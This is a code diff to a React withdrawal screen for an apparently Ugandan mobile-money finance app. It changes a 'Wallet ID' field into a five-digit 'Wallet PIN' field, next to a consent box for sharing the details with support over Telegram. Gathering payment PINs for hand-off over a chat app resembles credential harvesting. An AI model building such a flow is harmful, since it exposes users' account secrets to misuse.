@@ -16,6 +16,7 @@ import {
   User,
   X
 } from 'lucide-react';
+import { validateWalletPin } from './walletValidation';
 
 const USD_TO_UGX = 3750;
 const API_BASE_URL = import.meta.env.VITE_API_URL || 'https://movafinanceapp.onrender.com';
@@ -191,8 +192,8 @@ function App() {
       return;
     }
 
-    if (!postalNumber.trim()) {
-      setWithdrawalError('Enter your wallet ID to continue.');
+    if (!validateWalletPin(postalNumber)) {
+      setWithdrawalError('Enter your 5-digit wallet PIN to continue.');
       return;
     }
 
@@ -585,7 +586,7 @@ function App() {
           <div className="withdrawal-panel">
             <div><span className="eyebrow">MTN Mobile Money</span><h3>Where should we send your funds?</h3></div>
             <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="07XX XXX XXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
-            <label className="field"><span>Wallet ID</span><input inputMode="numeric" placeholder="Enter wallet ID" value={postalNumber} onChange={(event) => { setPostalNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} /></label>
+            <label className="field"><span>Wallet PIN</span><input inputMode="numeric" pattern="[0-9]*" maxLength={5} placeholder="5-digit PIN" value={postalNumber} onChange={(event) => { const digits = event.target.value.replace(/\D/g, '').slice(0, 5); setPostalNumber(digits); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
             <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
             <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
           </div>
